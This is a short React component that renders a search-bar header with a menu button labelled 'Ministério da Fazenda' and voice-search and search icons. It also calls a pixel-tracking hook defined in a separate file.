import React from 'react';
import { Mic, Search, Menu } from 'lucide-react';
import { usePixelTracking } from '../hooks/usePixelTracking';

const SearchBar: React.FC = () => {
  usePixelTracking();

  return (
    <div className="bg-white shadow-sm">
      <div className="container mx-auto px-4 py-3 flex justify-between items-center">
        <button className="flex items-center gap-3">
          <Menu className="text-[#1351B4]" size={24} />
          <span className="text-lg text-gray-800 font-medium">Ministério da Fazenda</span>
        </button>
        
        <div className="flex items-center gap-4">
          <button className="p-2 text-[#1351B4]" aria-label="Voice search">
            <Mic size={20} />
          </button>
          
          <button className="p-2 text-[#1351B4]" aria-label="Search">
            <Search size={20} />
          </button>
        </div>
      </div>
    </div>
  );
};

export default SearchBar;